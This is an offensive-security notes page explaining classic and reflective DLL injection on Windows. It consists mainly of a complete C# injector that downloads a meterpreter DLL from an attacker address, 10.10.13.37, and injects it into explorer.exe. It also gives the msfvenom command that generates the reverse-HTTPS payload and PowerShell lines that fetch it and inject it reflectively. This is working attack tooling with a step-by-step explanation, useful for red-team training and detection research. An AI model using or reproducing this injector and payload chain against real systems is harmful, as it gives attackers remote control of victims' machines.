---
description: Inject DLLs into remote process's virtual address space
---

# DLL Injectors




## Classic DLL Injection



### C\# Executable

A simple C# DLL injector to explain the basics:

1. Allocate space for the malicious DLL in remote process's virtual address space.
2. Write the DLL contents into the allocated space.
3. Locate the address of the [LoadLibraryA](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya) function in kernel32.dll with `GetModuleHandle` and `GetProcAddress`. Most Windows native DLLs are allocated at the same base address, so the obtained address of `LoadLibraryA` will be the same for the remote process.
4. Invoke `LoadLibraryA` function on the behalf of the remote thread supplying base `LoadLibraryA` address as the *4th* argument of `CreateRemoteThread` and the name of the DLL to be loaded as the *5th* argument.

All this is needed because `LoadLibrary` functions cannot be invoked natively on a remote process.

{% code title="DLLInjector.cs" %}
```csharp
using System;
using System.Net;
using System.Linq;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

namespace DLLInjector
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        static void Main(string[] args)
        {
            // Download the malicious DLL
            String dirName = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic);
            String dllName = dirName + "\\met.dll";
            WebClient wc = new WebClient();
            // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.13.37 LPORT=443 EXITFUNC=thread -f dll -o met.dll
            wc.DownloadFile("http://10.10.13.37/met.dll", dllName);

            // Get remote process handle
            Process[] pList = Process.GetProcessesByName("explorer");
            int processId = pList.First().Id;
            IntPtr hProcess = OpenProcess(0x001F0FFF, false, processId);

            // Allocate space for the DLL name in remote process's virtual address space and write it
            IntPtr dllAddress = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
            IntPtr outSize;
            WriteProcessMemory(hProcess, dllAddress, Encoding.Default.GetBytes(dllName), dllName.Length, out outSize);

            // Locate base address of the LoadLibraryA function in kernel32.dll (this address will be the same for the remote process)
            IntPtr loadLibraryAddress = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");

            // Invoke LoadLibraryA function in the remote process supplying starting address of the malicious DLL in its (process's) address space
            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLibraryAddress, dllAddress, 0, IntPtr.Zero);
        }
    }
}
```
{% endcode %}

{% hint style="warning" %}
According to [this](https://github.com/rapid7/metasploit-framework/blob/09fe84faed5fa055df54fdf858ebd0de750eb34f/data/templates/src/pe/dll/template.c) template that MSF is using to generate a DLL, there's another injection technique (Thread Execution Hijacking) [in the DLL code itself](https://github.com/rapid7/metasploit-framework/blob/09fe84faed5fa055df54fdf858ebd0de750eb34f/data/templates/src/pe/dll/template.c#L115) which is invoked upon `DLL_PROCESS_ATTACH` event. That causes the DLL not to be loaded in the target process memory, but it rather forces new shellcode to be executed by `rundll32.exe` and the malicios process (meterpreter shell, etc.) gets the PID of `rundll32.exe`. It may also result in hanging the parent's process (`explorer.exe` in terms of this example) and crashing it when the shell dies.
{% endhint %}




## Reflective DLL Injection

* [https://github.com/stephenfewer/ReflectiveDLLInjection#overview](https://github.com/stephenfewer/ReflectiveDLLInjection#overview)
* [https://github.com/dismantl/ImprovedReflectiveDLLInjection](https://github.com/dismantl/ImprovedReflectiveDLLInjection)
* [https://github.com/Moriarty2016/NimRDI](https://github.com/Moriarty2016/NimRDI)



### Invoke-ReflectivePEInjection

* [https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-ReflectivePEInjection.ps1](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-ReflectivePEInjection.ps1)

```
$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.13.37 LPORT=443 EXITFUNC=thread -f dll -o met.dll
PS > $bytes = (New-Object Net.WebClient).DownloadData("http://10.10.13.37/met.dll")
PS > Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId (Get-Process explorer).Id
```
